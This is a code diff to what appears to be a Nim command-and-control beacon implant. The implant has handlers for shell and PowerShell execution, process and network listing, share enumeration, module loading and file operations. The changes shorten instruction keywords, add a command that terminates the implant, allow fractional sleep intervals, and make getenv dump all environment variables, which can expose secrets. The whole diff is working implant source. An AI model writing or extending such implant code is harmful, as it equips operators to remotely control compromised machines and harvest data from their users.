@@ -78,7 +78,7 @@ const
   missingSleepValueMessage* = "Missing sleep value"
   invalidSleepValueMessage* = "Invalid sleep value"
   unknownInstructionMessage* = "Unknown instruction"
-  loadModuleNotRequiredMessage* = "Load Module is not required for this beacon"
+  loadModuleNotRequiredMessage* = "LoadModule is not required."
   missingPathMessage* = "Missing path argument"
   missingFilePathMessage* = "Missing file path"
   missingCommandMessage* = "Missing command"
@@ -91,7 +91,7 @@ const
   environmentVariableNotFoundMessage* = "Environment variable not found"
   treeGenerationFailureMessage* = "Failed to enumerate directory tree"
 
-  instructionLoadModule* = "loadmodule"
+  instructionLoadModule* = "lm"
   instructionLs* = "ls"
   instructionListDirectory* = "listdirectory"
   instructionPs* = "ps"
@@ -105,7 +105,8 @@ const
   instructionRun* = "run"
   instructionShell* = "shell"
   instructionPowershell* = "powershell"
-  instructionSleep* = "sleep"
+  instructionSleep* = "sl"
+  instructionEnd* = "en"
   instructionCat* = "cat"
   instructionMkDir* = "mkdir"
   instructionRemove* = "remove"
@@ -419,7 +420,7 @@ proc handleListProcesses(): string =
     var success = Process32FirstA(snapshot, addr entry) != 0
     while success:
       let exeName = $cast[cstring](addr entry.szExeFile[0])
-      lines.add(fmt"{entry.th32ProcessID}\t{entry.th32ParentProcessID}\t{entry.cntThreads}\t{exeName}")
+      lines.add(&"{entry.th32ProcessID}\t{entry.th32ParentProcessID}\t{entry.cntThreads}\t{exeName}")
       success = Process32NextA(snapshot, addr entry) != 0
     discard CloseHandle(snapshot)
     lines.join("\n")
@@ -438,7 +439,7 @@ proc handleListProcesses(): string =
       let statData = readProcessStat(basePath / "stat")
       let command = if cmdline.len > 0: cmdline else: statData.name
       let ppid = if statData.ppid.len > 0: statData.ppid else: "0"
-      entries.add((pid, fmt"{pid}\t{ppid}\t{command}"))
+      entries.add((pid, &"{pid}\t{ppid}\t{command}"))
     entries.sort(proc(a, b: tuple[pid: int, line: string]): int = cmp(a.pid, b.pid))
     var lines: seq[string] = @["PID\tPPID\tCommand"]
     for entry in entries:
@@ -638,12 +639,18 @@ proc handleShell(command: string): string =
 proc handleGetEnv(name: string): string =
   let trimmed = name.strip()
   if trimmed.len == 0:
-    return missingCommandMessage
-  let value = getEnv(trimmed, emptyString)
+    # No argument → list all environment variables
+    var resultStr = ""
+    for key, value in envPairs():
+      resultStr.add key & "=" & value & "\n"
+    return resultStr
+
+  # If argument provided → get single variable
+  let value = getEnv(trimmed, "")
   if value.len == 0:
-    environmentVariableNotFoundMessage
+    return "Environment variable not found: " & trimmed
   else:
-    value
+    return value
 
 
 proc handleWhoami(): string =
@@ -710,7 +717,7 @@ when defined(linux):
           except CatchableError:
             0
         let state = if stateIdx < tcpStates.len: tcpStates[stateIdx] else: tcpStates[0]
-        output.add(fmt"{proto}\t{localAddr}\t{remoteAddr}\t{state}")
+        output.add(fmt"{proto}" & "\t" & fmt"{localAddr}" & "\t" & fmt"{remoteAddr}" & "\t" & fmt"{state}")
     except CatchableError:
       discard
 
@@ -817,7 +824,7 @@ proc handleEnumerateShares(): string =
         let infoPtr = cast[ptr SHARE_INFO_1](offset)
         let name = $cast[WideCString](infoPtr.shi1_netname)
         let remark = if infoPtr.shi1_remark != nil: $cast[WideCString](infoPtr.shi1_remark) else: emptyString
-        lines.add(if remark.len > 0: fmt"{name}\t{remark}" else: name)
+        lines.add(if remark.len > 0: &"{name}\t{remark}" else: name)
     finally:
       discard NetApiBufferFree(buffer)
     if lines.len == 0:
@@ -986,12 +993,14 @@ proc execInstruction*(self: Beacon) =
       let sleepValue = if cmd.len > 0: cmd else: args
       if not isEmptyOrWhitespace(sleepValue):
         try:
-          self.sleepTimeMs = parseInt(sleepValue) * 1000
+          self.sleepTimeMs = int(parseFloat(sleepValue) * 1000.0)
           result = okMessage
         except ValueError:
           result = invalidSleepValueMessage
       else:
         result = missingSleepValueMessage
+    of instructionEnd:
+      quit(0)
     else:
       result = unknownInstructionMessage
 
